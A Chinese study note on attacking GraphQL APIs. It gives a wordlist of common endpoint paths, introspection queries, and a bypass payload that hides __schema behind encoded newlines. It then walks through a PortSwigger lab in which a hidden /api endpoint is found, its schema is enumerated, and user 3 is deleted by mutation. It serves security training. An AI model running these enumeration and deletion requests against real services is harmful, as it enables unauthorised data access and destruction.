---
title: 接口类型&GraphQL语法&内省利用查询&安全漏洞联动&端点结果解析&路径枚举
published: 2026-09-29T20:30:00
description: GraphQL API 攻防，涵盖常见路径、内省与绕过、隐藏端点爆破。通过 GET 参数触发内省枚举类型，并利用 query/mutation 查询和删除用户。最后结合 DVGA 靶场，复现 XSS、RCE、SSRF、任意文件上传等安全联动漏洞
tags:
  - GraphQL
  - API安全
category: 网络安全
draft: false
---

# 知识点

1. API攻防-类型利用-GraphQL&内省&联动

# GraphQL风格的测试（下部分）

## 常见的GraphQL路径

```
/api
/graphql
/graphql-console
/graphql-devtools
/graphql-explorer
/graphql-playground
/graphql-playground-html
/graphql.php
/graphql/console
/graphql/graphql
/graphql/graphql-playground
/graphql/schema.json
/graphql/schema.xml
/graphql/schema.yaml
/graphql/v1
/HyperGraphQL
/je/graphql
/laravel-graphql-playground
/lol/graphql
/portal-graphql
/v1/api/graphql
/v1/graphql
/v1/graphql-explorer
/v1/graphql.php
/v1/graphql/console
/v1/graphql/schema.json
/v1/graphql/schema.xml
/v1/graphql/schema.yaml
/v2/api/graphql
/v2/graphql
/v2/graphql-explorer
/v2/graphql.php
/graph
/graphql/console/
/graphiql
/graphiql.php
```

## 内省安全

https://graphql.cn/learn/introspection/

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL

以下是一些常见的内省攻击方法：

- 模式泄露：通过发送特定的内省查询（通常是__schema查询）来获取GraphQL模式的详细信息。攻击者可以利用这些信息来了解API的结构、类型和字段，甚至可能发现隐藏或敏感的功能。

- 类型混淆：攻击者可以通过查询和分析GraphQL模式来发现可能存在的类型混淆漏洞。类型混淆是指在GraphQL模式中存在多个具有相同名称但不同定义的类型，可能导致意外的数据访问或安全问题。

- 字段枚举：通过查询GraphQL模式，攻击者可以枚举目标API中的所有字段和关联关系。这些字段和关联关系的信息可以帮助攻击者了解数据模型、关系和功能，并进行后续攻击。

- 查询分析：攻击者可以通过发送大量的查询来分析GraphQL API的性能和复杂性。这可以帮助攻击者发现潜在的性能问题、资源消耗过高的查询以及可能的漏洞。

- 敏感信息泄露：通过分析GraphQL模式和执行查询，攻击者可以尝试获取敏感信息，如用户凭据、API密钥、数据库结构等。如果API没有正确保护这些信息，可能会导致信息泄露漏洞。

## 绕过内省

特殊字符绕过

尝试使用空格、换行符和逗号等字符，因为它们会被GraphQL忽略

弱正则匹配绕过，修改请求方式绕过，修改请求类型绕过

```
GET /api?query=query{__typename}

GET /api?query=%7b__schema%0a+++++%7bqueryType%7bname%7d%7d%7d

introspection Payload(Enumerate Database Schema via Introspection)
```

# 实验室：查找隐藏的 GraphQL 端点

该靶场和之前的不同，如题目，是隐藏的（**抓包是发现GraphQL接口的重要手段，但在某些情况下可能无法发现，此时需要主动探测**），因此需要爆破找到端点，字典使用文章开头部分的（注意将反斜杠去除）

```
GET /$x$ HTTP/1.1
Host: 0a7d00b7033c36ec81e86b69008000ce.web-security-academy.net
Referer: https://portswigger.net/
```

状态码为400，url为`api`

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 19

"Query not present"
```

官方文档：http://graphql.cn/learn/introspection/，在内省部分

```
{
  __schema {
    types {
      name
    }
  }
}
```

在api的数据包中以POST方式提交，发现方法不被允许，只能使用GET方法

项目：https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection，在`Identify An Injection Point`中，有get方式的验证注入点方法

```
GET /api?query= HTTP/2
Host: 0a7d00b7033c36ec81e86b69008000ce.web-security-academy.net

// 当在url中拼接?query=时，burp的插件就会识别并变为可使用的方式
// 在GraphQL插件中：
{
  __schema
      {
    types {
      name
    }
  }
}
```

返回了一些**GraphQL 类型（type）的名称列表**

```
{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "Boolean"
        },
        {
          "name": "DeleteOrganizationUserInput"
        },
        {
          "name": "DeleteOrganizationUserResponse"
        },
        {
          "name": "Int"
        },
        {
          "name": "String"
        },
        {
          "name": "User"
        },
        {
          "name": "__Directive"
        },
        {
          "name": "__DirectiveLocation"
        },
        {
          "name": "__EnumValue"
        },
        {
          "name": "__Field"
        },
        {
          "name": "__InputValue"
        },
        {
          "name": "__Schema"
        },
        {
          "name": "__Type"
        },
        {
          "name": "__TypeKind"
        },
        {
          "name": "mutation"
        },
        {
          "name": "query"
        }
      ]
    }
  }
}
```

此时将数据包发送到插件分析会报错，使用项目中提供的payload，将返回的各种名称、描述等等格式化并保存为文件以便于导入插件

其中有获取用户以及删除用户的两个接口，使用获取用户查询到id为3是目标

```
query getUser {
    getUser(id: 3) {
        id
        username
    }
}
```

此时使用删除用户，完成该靶场

```
mutation deleteOrganizationUser {
    deleteOrganizationUser(input: {id:3}) {
        user {
            id
            username
        }
    }
}
```

# 安全联动

靶场：github.com/dolevf/Damn-Vulnerable-GraphQL-Application

XSS存储型

RCE代码执行

SSRF请求伪造

任意文件上传

这个需要安装部署，因为服务器问题下载太慢，所以就没部署

以上的漏洞都在该靶场可以复现，同样也是该站点无法通过抓包发现graphql接口，通过爆破路径发现

之后就是在各个功能点抓包使用graphql接口进行测试